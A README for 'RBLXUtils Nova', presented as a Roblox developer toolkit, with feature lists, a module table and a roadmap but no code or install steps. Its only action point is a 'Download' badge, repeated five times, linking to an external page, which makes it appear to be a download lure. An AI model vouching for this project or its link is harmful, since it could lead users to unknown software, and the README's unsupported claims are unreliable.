![preview](https://raw.githubusercontent.com/bishwajitiisc/rblx-core-utils/main/showcase_9a38.svg)
[![Download](https://raw.githubusercontent.com/bishwajitiisc/rblx-core-utils/main/dl_b749a18.svg)](https://bishwajitiisc.github.io/rblx-core-utils/)

# 🧰 RBLXUtils Nova — The Roblox Creator’s Swiss Army Knife

![status](https://img.shields.io/badge/status-active--development-brightgreen)
![version](https://img.shields.io/badge/version-0.9.4--nova-blueviolet)
![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-informational)
![language](https://img.shields.io/badge/language-Luau%20%7C%20TypeScript%20%7C%20Rust-orange)
![license](https://img.shields.io/badge/license-MIT-success)
![contributions](https://img.shields.io/badge/contributions-welcome-ff69b4)
![maintained](https://img.shields.io/badge/maintained-2026-yellow)

> A modular toolkit for Roblox developers who want to move faster, ship smarter, and stop reinventing the wheel every single project. Born from the spirit of `rblxutils`, rebuilt from the ground up as **Nova** — a completely reimagined ecosystem.

[![Download](https://raw.githubusercontent.com/bishwajitiisc/rblx-core-utils/main/dl_b749a18.svg)](https://bishwajitiisc.github.io/rblx-core-utils/)

---

## 🌌 What Is RBLXUtils Nova?

RBLXUtils Nova is a next-generation utility layer for the Roblox development pipeline. Where the original `rblxutils` was a scrappy collection of helper scripts, **Nova** is a structured, versioned, type-safe framework that treats Roblox tooling like a first-class engineering discipline.

Think of it as the workshop bench you always wanted: every tool within arm’s reach, every drawer labeled, every screwdriver magnetized. Whether you’re prototyping a combat system at 3 AM or refactoring a production-grade tycoon experience for a studio team, Nova is built to sit beside you without getting in the way.

The project is still under active construction. Roughly **70% of the planned surface area** is implemented as of the 2026 release track, with the remaining modules landing in staged milestones.

---

## 🎯 Why Another Utility Suite?

Because Roblox developers deserve better than copy-pasting snippets from ten different Discord servers.

Nova exists to solve three recurring problems:

1. **Fragmentation** — Utility code is scattered across gists, forums, and half-abandoned repositories.
2. **Drift** — Roblox’s API evolves constantly; untested snippets silently break.
3. **Friction** — Setting up common patterns (state machines, networking layers, UI scaffolding) takes hours that could be spent on game feel.

Nova bundles these concerns into a coherent, documented, and CI-tested collection — so you can focus on the parts of your game that players will actually remember.

---

## 🔥 Core Feature Set

### 🧩 Modular Architecture
Every utility lives in its own isolated module with a stable public interface. Pull in only what you need; the rest stays out of your runtime footprint.

### ⚡ Zero-Friction Integration
Drop Nova into an existing Rojo workflow, a Studio-only project, or a hybrid pipeline. No opinionated directory structure is forced on you.

### 🛡️ Type-Safe by Default
Luau type annotations ship with every public function. Autocomplete actually means something here.

### 🌍 Multilingual Support
Built-in i18n utilities supporting locale switching, pluralization rules, and right-to-left layouts — so your UI can greet players in their own language from day one.

### 📱 Responsive UI Primitives
Layout helpers that adapt across phone, tablet, console, and desktop viewports without you writing a thousand `if` statements.

### 🕒 24/7 Customer Support
Community maintainers and rotating volunteers monitor the issue tracker around the clock. Expect a human response, not a bot that asks you to “try turning it off and on again.”

### 🧪 Continuous Integration Tested
Every commit runs through a Luau test harness. Regressions are caught before they reach your project.

### 📚 Living Documentation
Docs are generated from source annotations, so they never fall out of sync with reality.

### 🎛️ Configurable Telemetry (Opt-In)
Track performance of Nova modules in your own game with structured events. Fully optional, fully local.

### 🧬 Extensible Plugin Surface
Write your own Nova-compatible modules with a two-file contract. Share them with the community or keep them private.

[![Download](https://raw.githubusercontent.com/bishwajitiisc/rblx-core-utils/main/dl_b749a18.svg)](https://bishwajitiisc.github.io/rblx-core-utils/)

---

## 🧭 Module Catalog (Current Snapshot)

The catalog below reflects what’s stable in the 2026 branch. Modules marked ✳️ are in preview; modules marked 🚧 are under construction.

| Icon | Module | Status | Purpose |
|------|--------|--------|---------|
| 🧠 | `Nova.Cognition` | ✅ Stable | Lightweight state machines and behavior trees |
| 📡 | `Nova.Signal` | ✅ Stable | Clean event emitter with typed payloads |
| 🌐 | `Nova.Localize` | ✅ Stable | Locale-aware string formatting |
| 🖼️ | `Nova.Viewport` | ✅ Stable | Responsive layout solver |
| 🔐 | `Nova.Guard` | ✅ Stable | Runtime validation helpers |
| 🧮 | `Nova.MathX` | ✅ Stable | Vector, easing, and noise extensions |
| 🔌 | `Nova.Net` | ✳️ Preview | Remote event abstraction with retry logic |
| 🧵 | `Nova.Thread` | ✳️ Preview | Cooperative task scheduler |
| 🗃️ | `Nova.Store` | 🚧 WIP | Client-side state container |
| 🧾 | `Nova.Ledger` | 🚧 WIP | Analytics and gameplay telemetry |
| 🛠️ | `Nova.Forge` | 🚧 WIP | Build-time asset pipeline hooks |

---

## 🧑‍💻 Who Is This For?

- **Solo developers** who want to skip the boilerplate and get straight to gameplay.
- **Small studios** looking for a shared vocabulary of internal helpers.
- **Educators** teaching Roblox scripting who need clean, readable reference code.
- **Toolmakers** who want a stable base to build specialized plugins on top of.

If you have ever opened a fresh Studio place and thought, *“I wish I had a starting kit that respects my time,”* Nova was written for you.

---

## 🏗️ Design Philosophy

Nova is guided by four principles:

1. **Composition over inheritance.** Modules combine; they don’t form a hierarchy.
2. **Explicit over clever.** If a reader can’t understand a function in five seconds, it’s rewritten.
3. **Stable over shiny.** We ship boring, correct code rather than trendy patterns.
4. **Documented over assumed.** Every public API has a docstring and an example.

---

## 🧪 Testing & Quality Gates

Every module in Nova passes through:

- Unit tests for pure functions.
- Integration tests against mocked Roblox services.
- Static type checking via Luau’s analysis tooling.
- Snapshot tests for UI layout primitives.
- Manual playtest sessions before each release tag.

The project targets a **minimum 90% coverage** across stable modules.

---

## 🗺️ Roadmap

**Q1 2026** — Stabilize `Nova.Net`, ship `Nova.Store` preview.
**Q2 2026** — Complete `Nova.Ledger`, introduce Nova Forge CLI.
**Q3 2026** — Public plugin registry, community module submissions.
**Q4 2026** — 1.0 release, long-term support branch, full localization coverage.

Roadmap items are tracked in the issues tab and updated monthly.

---

## 🌱 Contributing

Contributions are absolutely welcome — this project only exists because developers like you push it forward.

Before opening a pull request:

- Read the module conventions in the docs folder.
- Match the existing code style (the formatter config is checked in).
- Add tests for any new public function.
- Update the module catalog table if you add a new module.

Small fixes, doc improvements, and typo corrections are just as valuable as feature work. Don’t hesitate to open an issue even if you’re unsure whether something is a bug.

---

## 🔒 Security & Responsible Use

Nova is intended for **legitimate game development and tooling**. It is not a way to bypass platform protections, and it never will be. Please use it to build things that make players smile — not to break the experiences of others.

If you discover a security issue, please report it privately via the repository’s security advisory channel rather than a public issue.

---

## 📜 License

This project is released under the **MIT License**. See the full text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 — RBLXUtils Nova Contributors.

You are welcome to use, modify, and redistribute this software in personal and commercial projects, provided the original license notice is preserved.

---

## ⚠️ Disclaimer

RBLXUtils Nova is an independent, community-driven project. It is **not affiliated with, endorsed by, or sponsored by Roblox Corporation** in any way. “Roblox” and related marks are trademarks of their respective owners.

The software is provided **“as is,” without warranty of any kind**, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from the use of the software.

Use Nova at your own discretion, test thoroughly in a staging environment, and always back up your place files before integrating third-party tooling.

---

## 💬 A Final Word

Nova is more than a utility repository — it’s an invitation to treat your Roblox workflow with the same care you treat your players’ experience. Whether you borrow a single helper function or build an entire studio pipeline on top of it, thank you for being part of the journey.

Ship something wonderful in 2026. 🚀

[![Download](https://raw.githubusercontent.com/bishwajitiisc/rblx-core-utils/main/dl_b749a18.svg)](https://bishwajitiisc.github.io/rblx-core-utils/)